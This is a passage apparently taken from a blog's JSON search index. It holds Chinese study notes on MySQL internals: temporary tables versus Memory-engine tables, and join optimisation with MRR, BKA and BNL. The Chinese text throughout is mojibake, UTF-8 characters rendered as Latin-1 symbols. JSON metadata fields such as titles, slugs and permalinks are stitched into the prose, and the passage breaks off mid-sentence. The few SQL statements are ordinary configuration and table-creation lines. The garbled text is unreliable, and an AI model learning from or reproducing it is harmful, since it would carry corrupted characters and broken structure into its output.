å˜æ¸…ä¸€ä¸ªå®¹æ˜“è¯¯è§£çš„é—®é¢˜ï¼šæœ‰çš„äººå¯èƒ½ä¼šè®¤ä¸ºï¼Œä¸´æ—¶è¡¨å°±æ˜¯å†…å­˜è¡¨ã€‚ä½†æ˜¯ï¼Œè¿™ä¸¤ä¸ªæ¦‚å¿µå¯æ˜¯å®Œå…¨ä¸åŒçš„ã€‚ å†…å­˜è¡¨ï¼ŒæŒ‡çš„æ˜¯ä½¿ç”¨ Memory å¼•æ“çš„è¡¨ï¼Œå»ºè¡¨è¯­æ³•æ˜¯ create table â€¦ engine=memoryã€‚è¿™ç§è¡¨çš„æ•°æ®éƒ½ä¿å­˜åœ¨å†…å­˜é‡Œï¼Œç³»ç»Ÿé‡å¯çš„æ—¶å€™ä¼šè¢«æ¸…ç©ºï¼Œä½†æ˜¯è¡¨ç»“æ„è¿˜åœ¨ã€‚é™¤äº†è¿™ä¸¤ä¸ªç‰¹æ€§çœ‹ä¸Šå»æ¯”è¾ƒâ€œå¥‡æ€ªâ€å¤–ï¼Œä»å…¶ä»–çš„ç‰¹å¾ä¸Šçœ‹ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¡¨ã€‚ è€Œä¸´æ—¶è¡¨ï¼Œå¯ä»¥ä½¿ç”¨å„ç§å¼•æ“ç±»å‹ ã€‚å¦‚æœæ˜¯ä½¿ç”¨ InnoDB å¼•æ“æˆ–è€… MyISAM å¼•æ“çš„ä¸´æ—¶è¡¨ï¼Œå†™æ•°æ®çš„æ—¶å€™æ˜¯å†™åˆ°ç£ç›˜ä¸Šçš„ã€‚å½“ç„¶ï¼Œä¸´æ—¶è¡¨ä¹Ÿå¯ä»¥ä½¿ç”¨ Memory å¼•æ“ã€‚ å¼„æ¸…æ¥šäº†å†…å­˜è¡¨å’Œä¸´æ—¶è¡¨çš„åŒºåˆ«ä»¥åï¼Œæˆ‘ä»¬å†æ¥çœ‹çœ‹ä¸´æ—¶è¡¨æœ‰å“ªäº›ç‰¹å¾ã€‚ ä¸´æ—¶è¡¨çš„ç‰¹æ€§ä¸ºäº†ä¾¿äºç†è§£ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸‹é¢è¿™ä¸ªæ“ä½œåºåˆ—ï¼š å¯ä»¥çœ‹åˆ°ï¼Œä¸´æ—¶è¡¨åœ¨ä½¿ç”¨ä¸Šæœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š å»ºè¡¨è¯­æ³•æ˜¯ create temporary table â€¦ã€‚ ä¸€ä¸ªä¸´æ—¶è¡¨åªèƒ½è¢«åˆ›å»ºå®ƒçš„ session è®¿é—®ï¼Œå¯¹å…¶ä»–çº¿ç¨‹ä¸å¯è§ã€‚æ‰€ä»¥ï¼Œå›¾ä¸­ session A åˆ›å»ºçš„ä¸´æ—¶è¡¨ tï¼Œå¯¹äº session B å°±æ˜¯ä¸å¯è§çš„ã€‚ ä¸´æ—¶è¡¨å¯ä»¥ä¸æ™®é€šè¡¨åŒåã€‚ session A å†…æœ‰åŒåçš„ä¸´æ—¶è¡¨å’Œæ™®é€šè¡¨çš„æ—¶å€™ï¼Œshow create è¯­å¥ï¼Œä»¥åŠå¢åˆ æ”¹æŸ¥è¯­å¥è®¿é—®çš„æ˜¯ä¸´æ—¶è¡¨ã€‚ show tables å‘½ä»¤ä¸æ˜¾ç¤ºä¸´æ—¶è¡¨ã€‚ ç”±äºä¸´æ—¶è¡¨åªèƒ½è¢«åˆ›å»ºå®ƒçš„ session è®¿é—®ï¼Œæ‰€ä»¥åœ¨è¿™ä¸ª session ç»“æŸçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨åˆ é™¤ä¸´æ—¶è¡¨ã€‚ä¹Ÿæ­£æ˜¯ç”±äºè¿™ä¸ªç‰¹æ€§ï¼Œä¸´æ—¶è¡¨å°±ç‰¹åˆ«é€‚åˆæˆ‘ä»¬æ–‡ç« å¼€å¤´çš„ join ä¼˜åŒ–è¿™ç§åœºæ™¯ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ åŸå› ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢ï¼š ä¸åŒ session çš„ä¸´æ—¶è¡¨æ˜¯å¯ä»¥é‡åçš„ï¼Œå¦‚æœæœ‰å¤šä¸ª session åŒæ—¶æ‰§è¡Œ join ä¼˜åŒ–ï¼Œä¸éœ€è¦æ‹…å¿ƒè¡¨åé‡å¤å¯¼è‡´å»ºè¡¨å¤±è´¥çš„é—®é¢˜ã€‚ ä¸éœ€è¦æ‹…å¿ƒæ•°æ®åˆ é™¤é—®é¢˜ã€‚å¦‚æœä½¿ç”¨æ™®é€šè¡¨ï¼Œåœ¨æµç¨‹æ‰§è¡Œè¿‡ç¨‹ä¸­å®¢æˆ·ç«¯å‘ç”Ÿäº†å¼‚å¸¸æ–­å¼€ï¼Œæˆ–è€…æ•°æ®åº“å‘ç”Ÿå¼‚å¸¸é‡å¯ï¼Œè¿˜éœ€è¦ä¸“é—¨æ¥æ¸…ç†ä¸­é—´è¿‡ç¨‹ä¸­ç”Ÿæˆçš„æ•°æ®è¡¨ã€‚è€Œä¸´æ—¶è¡¨ç”±äºä¼šè‡ªåŠ¨å›æ”¶ï¼Œæ‰€ä»¥ä¸éœ€è¦è¿™ä¸ªé¢å¤–çš„æ“ä½œã€‚ ä¸´æ—¶è¡¨çš„åº”ç”¨ç”±äºä¸ç”¨æ‹…å¿ƒçº¿ç¨‹ä¹‹é—´çš„é‡åå†²çªï¼Œä¸´æ—¶è¡¨ç»å¸¸ä¼šè¢«ç”¨åœ¨å¤æ‚æŸ¥è¯¢çš„ä¼˜åŒ–è¿‡ç¨‹ä¸­ã€‚å…¶ä¸­ï¼Œåˆ†åº“åˆ†è¡¨ç³»ç»Ÿçš„è·¨åº“æŸ¥è¯¢å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ä½¿ç”¨åœºæ™¯ã€‚ ä¸ºä»€ä¹ˆä¸´æ—¶è¡¨å¯ä»¥é‡åå½“æˆ‘ä»¬ä½¿ç”¨å»ºè¡¨è¯­å¥åˆ›å»ºä¸´æ—¶è¡¨æ—¶ï¼š 1create temporary table temp_t(id int primary key)engine&#x3D;innodb; è¿™ä¸ªæ—¶å€™ï¼ŒMySQL è¦ç»™è¿™ä¸ª InnoDB è¡¨åˆ›å»ºä¸€ä¸ª frm æ–‡ä»¶ä¿å­˜è¡¨ç»“æ„å®šä¹‰ï¼Œè¿˜è¦æœ‰åœ°æ–¹ä¿å­˜è¡¨æ•°æ®ã€‚ è¿™ä¸ª frm æ–‡ä»¶æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åçš„åç¼€æ˜¯.frmï¼Œå‰ç¼€æ˜¯â€œ#sql{è¿›ç¨‹ id}{çº¿ç¨‹ id} åºåˆ—å·â€ã€‚ä½ å¯ä»¥ä½¿ç”¨ select @@tmpdir å‘½ä»¤ï¼Œæ¥æ˜¾ç¤ºå®ä¾‹çš„ä¸´æ—¶æ–‡ä»¶ç›®å½•ã€‚ è€Œå…³äºè¡¨ä¸­æ•°æ®çš„å­˜æ”¾æ–¹å¼ï¼Œåœ¨ä¸åŒçš„ MySQL ç‰ˆæœ¬ä¸­æœ‰ç€ä¸åŒçš„å¤„ç†æ–¹å¼ï¼š åœ¨ 5.6 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬é‡Œï¼ŒMySQL ä¼šåœ¨ä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç›¸åŒå‰ç¼€ã€ä»¥.ibd ä¸ºåç¼€çš„æ–‡ä»¶ï¼Œç”¨æ¥å­˜æ”¾æ•°æ®æ–‡ä»¶ï¼› è€Œä» 5.7 ç‰ˆæœ¬å¼€å§‹ï¼ŒMySQL å¼•å…¥äº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶è¡¨ç©ºé—´ï¼Œä¸“é—¨ç”¨æ¥å­˜æ”¾ä¸´æ—¶æ–‡ä»¶çš„æ•°æ®ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦å†åˆ›å»º ibd æ–‡ä»¶äº†ã€‚ ä»æ–‡ä»¶åçš„å‰ç¼€è§„åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®åˆ›å»ºä¸€ä¸ªå«ä½œ t1 çš„ InnoDB ä¸´æ—¶è¡¨ï¼ŒMySQL åœ¨å­˜å‚¨ä¸Šè®¤ä¸ºæˆ‘ä»¬åˆ›å»ºçš„è¡¨åè·Ÿæ™®é€šè¡¨ t1 æ˜¯ä¸åŒçš„ï¼Œå› æ­¤åŒä¸€ä¸ªåº“ä¸‹é¢å·²ç»æœ‰æ™®é€šè¡¨ t1 çš„æƒ…å†µä¸‹ï¼Œè¿˜æ˜¯å¯ä»¥å†åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨ t1 çš„ã€‚ ä¸ºäº†ä¾¿äºåé¢è®¨è®ºï¼Œæˆ‘å…ˆæ¥ä¸¾ä¸€ä¸ªä¾‹å­ã€‚ ä¸´æ—¶è¡¨çš„å‘½åï¼š è¿™ä¸ªè¿›ç¨‹çš„è¿›ç¨‹å·æ˜¯ 1234ï¼Œsession A çš„çº¿ç¨‹ id æ˜¯ 4ï¼Œsession B çš„çº¿ç¨‹ id æ˜¯ 5ã€‚æ‰€ä»¥ä½ çœ‹åˆ°äº†ï¼Œsession A å’Œ session B åˆ›å»ºçš„ä¸´æ—¶è¡¨ï¼Œåœ¨ç£ç›˜ä¸Šçš„æ–‡ä»¶ä¸ä¼šé‡åã€‚ MySQL ç»´æŠ¤æ•°æ®è¡¨ï¼Œé™¤äº†ç‰©ç†ä¸Šè¦æœ‰æ–‡ä»¶å¤–ï¼Œå†…å­˜é‡Œé¢ä¹Ÿæœ‰ä¸€å¥—æœºåˆ¶åŒºåˆ«ä¸åŒçš„è¡¨ï¼Œæ¯ä¸ªè¡¨éƒ½å¯¹åº”ä¸€ä¸ª table_def_keyã€‚ ä¸€ä¸ªæ™®é€šè¡¨çš„ table_def_key çš„å€¼æ˜¯ç”±â€œåº“å + è¡¨åâ€å¾—åˆ°çš„ï¼Œæ‰€ä»¥å¦‚æœä½ è¦åœ¨åŒä¸€ä¸ªåº“ä¸‹åˆ›å»ºä¸¤ä¸ªåŒåçš„æ™®é€šè¡¨ï¼Œåˆ›å»ºç¬¬äºŒä¸ªè¡¨çš„è¿‡ç¨‹ä¸­å°±ä¼šå‘ç° table_def_key å·²ç»å­˜åœ¨äº†ã€‚è€Œå¯¹äºä¸´æ—¶è¡¨ï¼Œtable_def_key åœ¨â€œåº“å + è¡¨åâ€åŸºç¡€ä¸Šï¼ŒåˆåŠ å…¥äº†â€œserver_id+thread_idâ€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsession A å’Œ sessionB åˆ›å»ºçš„ä¸¤ä¸ªä¸´æ—¶è¡¨ t1ï¼Œå®ƒä»¬çš„ table_def_key ä¸åŒï¼Œç£ç›˜æ–‡ä»¶åä¹Ÿä¸åŒï¼Œå› æ­¤å¯ä»¥å¹¶å­˜ã€‚ åœ¨å®ç°ä¸Šï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½ç»´æŠ¤äº†è‡ªå·±çš„ä¸´æ—¶è¡¨é“¾è¡¨ã€‚è¿™æ ·æ¯æ¬¡ session å†…æ“ä½œè¡¨çš„æ—¶å€™ï¼Œå…ˆéå†é“¾è¡¨ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰è¿™ä¸ªåå­—çš„ä¸´æ—¶è¡¨ï¼Œå¦‚æœæœ‰å°±ä¼˜å…ˆæ“ä½œä¸´æ—¶è¡¨ï¼Œå¦‚æœæ²¡æœ‰å†æ“ä½œæ™®é€šè¡¨ï¼›åœ¨ session ç»“æŸçš„æ—¶å€™ï¼Œå¯¹é“¾è¡¨é‡Œçš„æ¯ä¸ªä¸´æ—¶è¡¨ï¼Œæ‰§è¡Œ â€œDROP TEMPORARY TABLE + è¡¨åâ€æ“ä½œã€‚ æ€»ç»“ å†…å­˜è¡¨ï¼ŒæŒ‡çš„æ˜¯ä½¿ç”¨ Memory å¼•æ“çš„è¡¨; è€Œä¸´æ—¶è¡¨ï¼Œå¯ä»¥ä½¿ç”¨å„ç§å¼•æ“ç±»å‹ã€‚ ä¸Šé¢è¯´åˆ°çš„è¿™ç§ä¸´æ—¶è¡¨ï¼Œæ˜¯ç”¨æˆ·è‡ªå·±åˆ›å»ºçš„ ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºç”¨æˆ·ä¸´æ—¶è¡¨ã€‚ ä¸´æ—¶è¡¨å¯ä»¥ä¸æ™®é€šè¡¨åŒå ä¸´æ—¶è¡¨åªèƒ½è¢«åˆ›å»ºå®ƒçš„ session è®¿é—®ï¼Œåœ¨è¿™ä¸ª session ç»“æŸçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨åˆ é™¤å¯¹åº”çš„ä¸´æ—¶è¡¨","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"35 joinè¯­å¥æ€ä¹ˆä¼˜åŒ–","slug":"how-to-optimize-the-join-statement","date":"2022-08-27T14:12:46.000Z","updated":"2023-02-18T03:28:33.601Z","comments":true,"path":"how-to-optimize-the-join-statement/","link":"","permalink":"https://www.0x2beace.com/how-to-optimize-the-join-statement/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ MRR ä¼˜åŒ– äº†è§£ BKA ç®—æ³•","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£ MRR ä¼˜åŒ– äº†è§£ BKA ç®—æ³• åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œäº†è§£äº† join è¯­å¥çš„ä¸¤ç§ç®—æ³•ï¼Œåˆ†åˆ«æ˜¯ Index Nested-Loop Join(NLJ) å’Œ Block Nested-Loop Join(BNL)ã€‚ NLJ ç®—æ³•ï¼Œæ•ˆæœå…¶å®è¿˜æ˜¯ä¸é”™çš„ï¼Œæ¯”é€šè¿‡åº”ç”¨å±‚æ‹†åˆ†æˆå¤šä¸ªè¯­å¥ç„¶åå†æ‹¼æ¥æŸ¥è¯¢ç»“æœæ›´æ–¹ä¾¿ï¼Œè€Œä¸”æ€§èƒ½ä¹Ÿä¸ä¼šå·®ã€‚ ä½†æ˜¯ï¼ŒBNL ç®—æ³•åœ¨å¤§è¡¨ join çš„æ—¶å€™æ€§èƒ½å°±å·®å¤šäº†ï¼Œæ¯”è¾ƒæ¬¡æ•°ç­‰äºä¸¤ä¸ªè¡¨å‚ä¸ join çš„è¡Œæ•°çš„ä¹˜ç§¯ï¼Œå¾ˆæ¶ˆè€— CPU èµ„æºã€‚ Multi-Range Read ä¼˜åŒ–åœ¨ä»‹ç» join è¯­å¥çš„ä¼˜åŒ–æ–¹æ¡ˆä¹‹å‰ï¼Œæˆ‘éœ€è¦å…ˆå’Œä½ ä»‹ç»ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå³ï¼šMulti-Range Read ä¼˜åŒ– (MRR)ã€‚è¿™ä¸ªä¼˜åŒ–çš„ä¸»è¦ç›®çš„æ˜¯å°½é‡ä½¿ç”¨é¡ºåºè¯»ç›˜ã€‚ åœ¨ç¬¬ 4 ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å’Œä½ ä»‹ç» InnoDB çš„ç´¢å¼•ç»“æ„æ—¶ï¼Œæåˆ°äº†â€œå›è¡¨â€çš„æ¦‚å¿µã€‚æˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹è¿™ä¸ªæ¦‚å¿µã€‚å›è¡¨æ˜¯æŒ‡ï¼ŒInnoDB åœ¨æ™®é€šç´¢å¼• a ä¸ŠæŸ¥åˆ°ä¸»é”® id çš„å€¼åï¼Œå†æ ¹æ®ä¸€ä¸ªä¸ªä¸»é”® id çš„å€¼åˆ°ä¸»é”®ç´¢å¼•ä¸Šå»æŸ¥æ•´è¡Œæ•°æ®çš„è¿‡ç¨‹ã€‚ å› ä¸ºä¸»é”®ç´¢å¼•æ˜¯ä¸€æ£µ B+ æ ‘ï¼Œåœ¨è¿™æ£µæ ‘ä¸Šï¼Œæ¯æ¬¡åªèƒ½æ ¹æ®ä¸€ä¸ªä¸»é”® id æŸ¥åˆ°ä¸€è¡Œæ•°æ®ã€‚å› æ­¤ï¼Œå›è¡¨æ˜¯ä¸€è¡Œè¡Œæœç´¢ä¸»é”®ç´¢å¼•çš„ï¼ŒåŸºæœ¬æµç¨‹å¦‚å›¾ 1 æ‰€ç¤ºã€‚ å¦‚æœéšç€ a çš„å€¼é€’å¢é¡ºåºæŸ¥è¯¢çš„è¯ï¼Œid çš„å€¼å°±å˜æˆéšæœºçš„ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°éšæœºè®¿é—®ï¼Œæ€§èƒ½ç›¸å¯¹è¾ƒå·®ã€‚è™½ç„¶â€œæŒ‰è¡ŒæŸ¥â€è¿™ä¸ªæœºåˆ¶ä¸èƒ½æ”¹ï¼Œä½†æ˜¯è°ƒæ•´æŸ¥è¯¢çš„é¡ºåºï¼Œè¿˜æ˜¯èƒ½å¤ŸåŠ é€Ÿçš„ã€‚ å› ä¸ºå¤§å¤šæ•°çš„æ•°æ®éƒ½æ˜¯æŒ‰ç…§ä¸»é”®é€’å¢é¡ºåºæ’å…¥å¾—åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¤ä¸ºï¼Œå¦‚æœæŒ‰ç…§ä¸»é”®çš„é€’å¢é¡ºåºæŸ¥è¯¢çš„è¯ï¼Œå¯¹ç£ç›˜çš„è¯»æ¯”è¾ƒæ¥è¿‘é¡ºåºè¯»ï¼Œèƒ½å¤Ÿæå‡è¯»æ€§èƒ½ã€‚ è¿™å°±æ˜¯ MRR ä¼˜åŒ–çš„è®¾è®¡æ€è·¯ã€‚æ­¤æ—¶ï¼Œè¯­å¥çš„æ‰§è¡Œæµç¨‹å˜æˆäº†è¿™æ ·ï¼š æ ¹æ®ç´¢å¼• aï¼Œå®šä½åˆ°æ»¡è¶³æ¡ä»¶çš„è®°å½•ï¼Œå°† id å€¼æ”¾å…¥ read_rnd_buffer ä¸­ å°† read_rnd_buffer ä¸­çš„ id è¿›è¡Œé€’å¢æ’åº æ’åºåçš„ id æ•°ç»„ï¼Œä¾æ¬¡åˆ°ä¸»é”® id ç´¢å¼•ä¸­æŸ¥è®°å½•ï¼Œå¹¶ä½œä¸ºç»“æœè¿”å› è¿™é‡Œï¼Œread_rnd_buffer çš„å¤§å°æ˜¯ç”± read_rnd_buffer_size å‚æ•°æ§åˆ¶çš„ã€‚å¦‚æœæ­¥éª¤ 1 ä¸­ï¼Œread_rnd_buffer æ”¾æ»¡äº†ï¼Œå°±ä¼šå…ˆæ‰§è¡Œå®Œæ­¥éª¤ 2 å’Œ 3ï¼Œç„¶åæ¸…ç©º read_rnd_bufferã€‚ä¹‹åç»§ç»­æ‰¾ç´¢å¼• a çš„ä¸‹ä¸ªè®°å½•ï¼Œå¹¶ç»§ç»­å¾ªç¯ã€‚ å¦å¤–éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œå¦‚æœä½ æƒ³è¦ç¨³å®šåœ°ä½¿ç”¨ MRR ä¼˜åŒ–çš„è¯ï¼Œéœ€è¦è®¾ç½®set optimizer_switch=â€mrr_cost_based=offâ€ã€‚ï¼ˆå®˜æ–¹æ–‡æ¡£çš„è¯´æ³•ï¼Œæ˜¯ç°åœ¨çš„ä¼˜åŒ–å™¨ç­–ç•¥ï¼Œåˆ¤æ–­æ¶ˆè€—çš„æ—¶å€™ï¼Œä¼šæ›´å€¾å‘äºä¸ä½¿ç”¨ MRRï¼ŒæŠŠ mrr_cost_based è®¾ç½®ä¸º offï¼Œå°±æ˜¯å›ºå®šä½¿ç”¨ MRR äº†ã€‚ï¼‰ ä¸‹é¢ä¸¤å¹…å›¾å°±æ˜¯ä½¿ç”¨äº† MRR ä¼˜åŒ–åçš„æ‰§è¡Œæµç¨‹å’Œ explain ç»“æœã€‚ MRR æ‰§è¡Œæµç¨‹çš„ explain ç»“æœï¼š ä»å›¾ 3 çš„ explain ç»“æœä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° Extra å­—æ®µå¤šäº† Using MRRï¼Œè¡¨ç¤ºçš„æ˜¯ç”¨ä¸Šäº† MRR ä¼˜åŒ–ã€‚è€Œä¸”ï¼Œç”±äºæˆ‘ä»¬åœ¨ read_rnd_buffer ä¸­æŒ‰ç…§ id åšäº†æ’åºï¼Œæ‰€ä»¥æœ€åå¾—åˆ°çš„ç»“æœé›†ä¹Ÿæ˜¯æŒ‰ç…§ä¸»é”® id é€’å¢é¡ºåºçš„ï¼Œä¹Ÿå°±æ˜¯ä¸å›¾ 1 ç»“æœé›†ä¸­è¡Œçš„é¡ºåºç›¸åã€‚ MRR èƒ½å¤Ÿæå‡æ€§èƒ½çš„æ ¸å¿ƒåœ¨äºï¼Œè¿™æ¡æŸ¥è¯¢è¯­å¥åœ¨ç´¢å¼• a ä¸Šåšçš„æ˜¯ä¸€ä¸ªèŒƒå›´æŸ¥è¯¢ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªå¤šå€¼æŸ¥è¯¢ï¼‰ï¼Œå¯ä»¥å¾—åˆ°è¶³å¤Ÿå¤šçš„ä¸»é”® idã€‚è¿™æ ·é€šè¿‡æ’åºä»¥åï¼Œå†å»ä¸»é”®ç´¢å¼•æŸ¥æ•°æ®ï¼Œæ‰èƒ½ä½“ç°å‡ºâ€œé¡ºåºæ€§â€çš„ä¼˜åŠ¿ã€‚ Batched Key Accessç†è§£äº† MRR æ€§èƒ½æå‡çš„åŸç†ï¼Œæˆ‘ä»¬å°±èƒ½ç†è§£ MySQL åœ¨ 5.6 ç‰ˆæœ¬åå¼€å§‹å¼•å…¥çš„ Batched Key Access(BKA) ç®—æ³•äº†ã€‚è¿™ä¸ª BKA ç®—æ³•ï¼Œå…¶å®å°±æ˜¯å¯¹ NLJ ç®—æ³•çš„ä¼˜åŒ–ã€‚ æˆ‘ä»¬å†æ¥çœ‹çœ‹ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ç”¨åˆ°çš„ NLJ ç®—æ³•çš„æµç¨‹å›¾ï¼š NLJ ç®—æ³•æ‰§è¡Œçš„é€»è¾‘æ˜¯ï¼šä»é©±åŠ¨è¡¨ t1ï¼Œä¸€è¡Œè¡Œåœ°å–å‡º a çš„å€¼ï¼Œå†åˆ°è¢«é©±åŠ¨è¡¨ t2 å»åš joinã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºè¡¨ t2 æ¥è¯´ï¼Œæ¯æ¬¡éƒ½æ˜¯åŒ¹é…ä¸€ä¸ªå€¼ã€‚è¿™æ—¶ï¼ŒMRR çš„ä¼˜åŠ¿å°±ç”¨ä¸ä¸Šäº†ã€‚ é‚£æ€ä¹ˆæ‰èƒ½ä¸€æ¬¡æ€§åœ°å¤šä¼ äº›å€¼ç»™è¡¨ t2 å‘¢ï¼Ÿæ–¹æ³•å°±æ˜¯ï¼Œä»è¡¨ t1 é‡Œä¸€æ¬¡æ€§åœ°å¤šæ‹¿äº›è¡Œå‡ºæ¥ï¼Œä¸€èµ·ä¼ ç»™è¡¨ t2ã€‚ æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±æŠŠè¡¨ t1 çš„æ•°æ®å–å‡ºæ¥ä¸€éƒ¨åˆ†ï¼Œå…ˆæ”¾åˆ°ä¸€ä¸ªä¸´æ—¶å†…å­˜ã€‚è¿™ä¸ªä¸´æ—¶å†…å­˜ä¸æ˜¯åˆ«äººï¼Œå°±æ˜¯ join_bufferã€‚ é€šè¿‡ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬çŸ¥é“ join_buffer åœ¨ BNL ç®—æ³•é‡Œçš„ä½œç”¨ï¼Œæ˜¯æš‚å­˜é©±åŠ¨è¡¨çš„æ•°æ®ã€‚ä½†æ˜¯åœ¨ NLJ ç®—æ³•é‡Œå¹¶æ²¡æœ‰ç”¨ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬åˆšå¥½å°±å¯ä»¥å¤ç”¨ join_buffer åˆ° BKA ç®—æ³•ä¸­ã€‚ å¦‚å›¾ 5 æ‰€ç¤ºï¼Œæ˜¯ä¸Šé¢çš„ NLJ ç®—æ³•ä¼˜åŒ–åçš„ BKA ç®—æ³•çš„æµç¨‹ã€‚ å›¾ä¸­ï¼Œæˆ‘åœ¨ join_buffer ä¸­æ”¾å…¥çš„æ•°æ®æ˜¯ P1P100ï¼Œè¡¨ç¤ºçš„æ˜¯åªä¼šå–æŸ¥è¯¢éœ€è¦çš„å­—æ®µã€‚å½“ç„¶ï¼Œå¦‚æœ join buffer æ”¾ä¸ä¸‹ P1P100 çš„æ‰€æœ‰æ•°æ®ï¼Œå°±ä¼šæŠŠè¿™ 100 è¡Œæ•°æ®åˆ†æˆå¤šæ®µæ‰§è¡Œä¸Šå›¾çš„æµç¨‹ã€‚ é‚£ä¹ˆï¼Œè¿™ä¸ª BKA ç®—æ³•åˆ°åº•è¦æ€ä¹ˆå¯ç”¨å‘¢ï¼Ÿ å¦‚æœè¦ä½¿ç”¨ BKA ä¼˜åŒ–ç®—æ³•çš„è¯ï¼Œä½ éœ€è¦åœ¨æ‰§è¡Œ SQL è¯­å¥ä¹‹å‰ï¼Œå…ˆè®¾ç½® 1set optimizer_switch&#x3D;&#39;mrr&#x3D;on,mrr_cost_based&#x3D;off,batched_key_access&#x3D;on&#39;; å…¶ä¸­ï¼Œå‰ä¸¤ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯è¦å¯ç”¨ MRRã€‚è¿™ä¹ˆåšçš„åŸå› æ˜¯ï¼ŒBKA ç®—æ³•çš„ä¼˜åŒ–è¦ä¾èµ–äº MRRã€‚ BNL ç®—æ³•çš„æ€§èƒ½é—®é¢˜è¯´å®Œäº† NLJ ç®—æ³•çš„ä¼˜åŒ–ï¼Œå†æ¥çœ‹ BNL ç®—æ³•çš„ä¼˜åŒ–ã€‚ ç”±äº InnoDB å¯¹ Bufffer Pool çš„ LRU ç®—æ³•åšäº†ä¼˜åŒ–ï¼Œå³ï¼šç¬¬ä¸€æ¬¡ä»ç£ç›˜è¯»å…¥å†…å­˜çš„æ•°æ®é¡µï¼Œä¼šå…ˆæ”¾åœ¨ old åŒºåŸŸã€‚å¦‚æœ 1 ç§’ä¹‹åè¿™ä¸ªæ•°æ®é¡µä¸å†è¢«è®¿é—®äº†ï¼Œå°±ä¸ä¼šè¢«ç§»åŠ¨åˆ° LRU é“¾è¡¨å¤´éƒ¨ï¼Œè¿™æ ·å¯¹ Buffer Pool çš„å‘½ä¸­ç‡å½±å“å°±ä¸å¤§ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªä½¿ç”¨ BNL ç®—æ³•çš„ join è¯­å¥ï¼Œå¤šæ¬¡æ‰«æä¸€ä¸ªå†·è¡¨ï¼Œè€Œä¸”è¿™ä¸ªè¯­å¥æ‰§è¡Œæ—¶é—´è¶…è¿‡ 1 ç§’ï¼Œå°±ä¼šåœ¨å†æ¬¡æ‰«æå†·è¡¨çš„æ—¶å€™ï¼ŒæŠŠå†·è¡¨çš„æ•°æ®é¡µç§»åˆ° LRU é“¾è¡¨å¤´éƒ¨ã€‚ è¿™ç§æƒ…å†µå¯¹åº”çš„ï¼Œæ˜¯å†·è¡¨çš„æ•°æ®é‡å°äºæ•´ä¸ª Buffer Pool çš„ 3/8ï¼Œèƒ½å¤Ÿå®Œå…¨æ”¾å…¥ old åŒºåŸŸçš„æƒ…å†µã€‚ å¦‚æœè¿™ä¸ªå†·è¡¨å¾ˆå¤§ï¼Œå°±ä¼šå‡ºç°å¦å¤–ä¸€ç§æƒ…å†µï¼šä¸šåŠ¡æ­£å¸¸è®¿é—®çš„æ•°æ®é¡µï¼Œæ²¡æœ‰æœºä¼šè¿›å…¥ young åŒºåŸŸã€‚ ç”±äºä¼˜åŒ–æœºåˆ¶çš„å­˜åœ¨ï¼Œä¸€ä¸ªæ­£å¸¸è®¿é—®çš„æ•°æ®é¡µï¼Œè¦è¿›å…¥ young åŒºåŸŸï¼Œéœ€è¦éš” 1 